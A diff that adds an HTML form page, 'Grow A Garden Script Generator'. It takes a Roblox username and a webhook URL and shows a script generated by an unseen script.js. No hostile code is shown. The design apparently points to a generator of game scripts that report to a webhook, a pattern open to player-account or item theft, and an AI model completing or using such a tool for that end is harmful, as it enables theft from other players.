@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Grow A Garden Script Generator</title>
+<link rel="stylesheet" href="/static/style.css" />
+</head>
+<body>
+  <h1>Grow A Garden Script Generator</h1>
+  <form id="scriptForm">
+    <label>
+      Roblox Username: <input type="text" id="username" required />
+    </label><br/><br/>
+    <label>
+      Webhook URL: <input type="text" id="webhook" required />
+    </label><br/><br/>
+    <button type="submit">Get Script</button>
+  </form>
+
+  <h2>Your Script:</h2>
+  <pre id="scriptOutput" style="white-space: pre-wrap; background:#111; color:#0f0; padding:1em; max-height:400px; overflow:auto;"></pre>
+
+  <script src="/static/script.js"></script>
+</body>
+</html>
